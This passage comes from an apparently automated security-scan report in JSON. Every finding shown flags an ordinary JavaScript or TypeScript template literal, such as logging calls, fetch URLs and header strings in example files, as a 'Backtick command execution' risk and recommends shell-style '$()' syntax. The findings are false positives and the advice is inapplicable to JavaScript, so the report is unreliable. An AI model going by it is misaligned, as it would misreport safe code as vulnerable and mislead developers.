        "evidence": "console.log(`  [Cache] Size after invalidation: ${cache.size}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 18,
        "issue": "Backtick command execution",
        "evidence": "this.key = `leaderboard:${name}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 29,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Leaderboard] Added ${playerId} with score ${score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 41,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Leaderboard] Incremented ${playerId} by ${increment} (new: ${newScore})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 140,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Leaderboard] Removed ${playerId}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 157,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Leaderboard] Cleared`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 171,
        "issue": "Backtick command execution",
        "evidence": "super(redisClient, `${name}:${period}:${timestamp}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 190,
        "issue": "Backtick command execution",
        "evidence": "return `${now.getFullYear()}-W${week}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 193,
        "issue": "Backtick command execution",
        "evidence": "return `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 220,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Leaderboard] Set expiration: ${days} days`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 248,
        "issue": "Backtick command execution",
        "evidence": "console.log(`${p.rank + 1}. ${p.player}: ${p.score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 256,
        "issue": "Backtick command execution",
        "evidence": "console.log(`${player}: Rank ${rank + 1}, Score ${score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 264,
        "issue": "Backtick command execution",
        "evidence": "console.log(`player3: New Rank ${newRank + 1}, New Score ${newScore}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 271,
        "issue": "Backtick command execution",
        "evidence": "console.log(`${p.rank + 1}. ${p.player}: ${p.score}${marker}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 277,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Total players: ${count}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 295,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Key: ${daily.key}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 304,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${p.rank + 1}. ${p.player}: ${p.score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 313,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Key: ${weekly.key}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 322,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${p.rank + 1}. ${p.player}: ${p.score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 344,
        "issue": "Backtick command execution",
        "evidence": "await leaderboard.addScore(`player${i}`, i * 100);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 351,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${p.player}: ${p.score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 357,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Found ${highScorers.length} high scorers`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 359,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${p.player}: ${p.score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 401,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${p.rank + 1}. ${p.player}: ${p.score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 407,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${p.rank + 1}. ${p.player}: ${p.score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 413,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${p.rank + 1}. ${p.player}: ${p.score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 418,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Casual: ${await casual.getScore('player1')} (Rank ${await casual.getRank('player1') + 1})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 419,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Ranked: ${await ranked.getScore('player1')} (Rank ${await ranked.getRank('player1') + 1})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 420,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Tournament: ${await tournament.getScore('player1')} (Rank ${await tournament.getRank('player1') + 1})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 321,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Found ${results1.length} results`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 323,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [${r.score.toFixed(2)}] ${r.name} - $${r.price}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 329,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Found ${suggestions.length} suggestions`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 331,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${s.text}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 337,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Found ${faceted.results.length} results`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 347,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Found ${boosted.length} results`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 349,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [${r.score.toFixed(2)}] ${r.name}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 355,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Page 1: ${page1.results.length} results, hasMore: ${page1.hasMore}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 359,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Page 2: ${page2.results.length} results`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 246,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Change ${i + 1}:`, change.change.message || '(no message)');",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 249,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\\nTotal changes: ${history.length}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 250,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Current counter: ${doc.counter}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 310,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [${todo.done ? '\u2713' : ' '}] ${todo.text}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 329,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [${todo.done ? '\u2713' : ' '}] ${todo.text}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 334,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [${todo.done ? '\u2713' : ' '}] ${todo.text}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 344,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [${todo.done ? '\u2713' : ' '}] ${todo.text}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 349,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [${todo.done ? '\u2713' : ' '}] ${todo.text}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 379,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\\nSaved to ${bytes.length} bytes`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-authentication/resources/examples/typescript/jwt-auth-client.ts",
        "line_number": 58,
        "issue": "Backtick command execution",
        "evidence": "config.headers.Authorization = `Bearer ${token}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-authentication/resources/examples/typescript/jwt-auth-client.ts",
        "line_number": 83,
        "issue": "Backtick command execution",
        "evidence": "originalRequest.headers.Authorization = `Bearer ${token}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-authentication/resources/examples/typescript/jwt-auth-client.ts",
        "line_number": 154,
        "issue": "Backtick command execution",
        "evidence": "`${this.api.defaults.baseURL}/refresh`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
        "line_number": 131,
        "issue": "Backtick command execution",
        "evidence": "const cacheKey = `${options.method}:${url}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
        "line_number": 149,
        "issue": "Backtick command execution",
        "evidence": "headers['Authorization'] = `Bearer ${this.apiKey}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
        "line_number": 287,
        "issue": "Backtick command execution",
        "evidence": "return this.request<User>(`/api/users/${userId}`, {",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
        "line_number": 306,
        "issue": "Backtick command execution",
        "evidence": "return this.request<User>(`/api/users/${userId}`, {",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
        "line_number": 316,
        "issue": "Backtick command execution",
        "evidence": "return this.request<User>(`/api/users/${userId}`, {",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
        "line_number": 326,
        "issue": "Backtick command execution",
        "evidence": "return this.request<void>(`/api/users/${userId}`, {",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_server.ts",
        "line_number": 391,
        "issue": "Backtick command execution",
        "evidence": "message: `Post not found: ${id}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_server.ts",
        "line_number": 466,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\ud83d\ude80 GraphQL server ready at ${url}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_client.ts",
        "line_number": 270,
        "issue": "Backtick command execution",
        "evidence": "id: `temp-${Date.now()}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_client.ts",
        "line_number": 291,
        "issue": "Backtick command execution",
        "evidence": "cursor: `temp-${Date.now()}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_client.ts",
        "line_number": 388,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Found ${postsPage1.totalCount} total posts`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_client.ts",
        "line_number": 395,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Retrieved ${allPosts.length} posts`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_client.ts",
        "line_number": 432,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Update: ${posts.edges.length} posts in cache`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 273,
        "issue": "Backtick command execution",
        "evidence": ".get(`/users/${userId}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 313,
        "issue": "Backtick command execution",
        "evidence": "name: `User ${i}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 314,
        "issue": "Backtick command execution",
        "evidence": "email: `user${i}@example.com`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 359,
        "issue": "Backtick command execution",
        "evidence": ".patch(`/users/${userId}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 373,
        "issue": "Backtick command execution",
        "evidence": "const getResponse = await request(app).get(`/users/${userId}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 404,
        "issue": "Backtick command execution",
        "evidence": ".delete(`/users/${userId}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 409,
        "issue": "Backtick command execution",
        "evidence": ".get(`/users/${userId}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 435,
        "issue": "Backtick command execution",
        "evidence": ".get(`/users/${userId}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 442,
        "issue": "Backtick command execution",
        "evidence": ".patch(`/users/${userId}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 453,
        "issue": "Backtick command execution",
        "evidence": ".delete(`/users/${userId}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 458,
        "issue": "Backtick command execution",
        "evidence": ".get(`/users/${userId}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 485,
        "issue": "Backtick command execution",
        "evidence": "name: `User ${i}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 486,
        "issue": "Backtick command execution",
        "evidence": "email: `user${i}@perf.com`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
        "line_number": 49,
        "issue": "Backtick command execution",
        "evidence": "let hstsValue = `max-age=${hstsMaxAge}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
        "line_number": 194,
        "issue": "Backtick command execution",
        "evidence": "`script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
        "line_number": 195,
        "issue": "Backtick command execution",
        "evidence": "`style-src 'self' 'nonce-${nonce}'`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
        "line_number": 253,
        "issue": "Backtick command execution",
        "evidence": "*       <style nonce={nonce}>{`body { margin: 0; }`}</style>",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
        "line_number": 418,
        "issue": "Backtick command execution",
        "evidence": "\\`script-src 'self' 'nonce-\\${nonce}' 'strict-dynamic'\\`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
        "line_number": 419,
        "issue": "Backtick command execution",
        "evidence": "\\`style-src 'self' 'nonce-\\${nonce}'\\`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/examples/typescript/otel_express_tracing.ts",
        "line_number": 220,
        "issue": "Backtick command execution",
        "evidence": "const orderId = `order-${Date.now()}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/examples/typescript/otel_express_tracing.ts",
        "line_number": 368,
        "issue": "Backtick command execution",
        "evidence": "throw new Error(`Cannot fulfill order in status: ${order.status}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/examples/typescript/otel_express_tracing.ts",
        "line_number": 454,
        "issue": "Backtick command execution",
        "evidence": "console.log(`${SERVICE_NAME} listening on port ${PORT}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/examples/typescript/otel_express_tracing.ts",
        "line_number": 455,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Traces will be sent to: ${OTLP_ENDPOINT}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/examples/typescript/express_metrics.ts",
        "line_number": 348,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Metrics endpoint: http://localhost:${PORT}/metrics`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/zustand-store.ts",
        "line_number": 146,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/users/${id}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/zustand-store.ts",
        "line_number": 157,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/users/${id}`, {",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/zustand-store.ts",
        "line_number": 177,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/users/${id}`, { method: 'DELETE' });",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
        "line_number": 91,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/users/${id}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
        "line_number": 97,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/posts?page=${page}&pageSize=${pageSize}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
        "line_number": 103,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/posts/${id}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
        "line_number": 109,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/posts/${postId}/comments`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
        "line_number": 125,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/posts/${id}`, {",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
        "line_number": 135,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/posts/${id}`, { method: 'DELETE' });",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/robots.ts",
        "line_number": 78,
        "issue": "Backtick command execution",
        "evidence": "sitemap: `${baseUrl}/sitemap.xml`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/robots.ts",
        "line_number": 359,
        "issue": "Backtick command execution",
